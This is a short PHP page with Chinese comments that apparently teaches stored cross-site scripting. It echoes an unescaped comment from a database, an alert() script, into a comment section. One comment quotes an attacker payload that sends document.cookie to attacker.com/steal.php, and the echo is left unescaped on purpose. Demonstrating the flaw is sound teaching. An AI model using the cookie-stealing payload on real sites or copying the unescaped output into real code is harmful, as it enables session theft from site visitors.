<?php
// 假設這是從資料庫撈出來的留言資料
// 駭客之前在留言框輸入了：<script>window.location="http://attacker.com/steal.php?cookie=" + document.cookie</script>
$comment_from_db = "<script>alert('儲存型 XSS 攻擊成功！')</script>"; 
?>

<!DOCTYPE html>
<html>
<head><title>文章留言區</title></head>
<body>
    <h1>最新留言</h1>
    <div class="comment-box">
        <p>訪客留言：<?php echo $comment_from_db; ?></p>
    </div>
</body>
</html>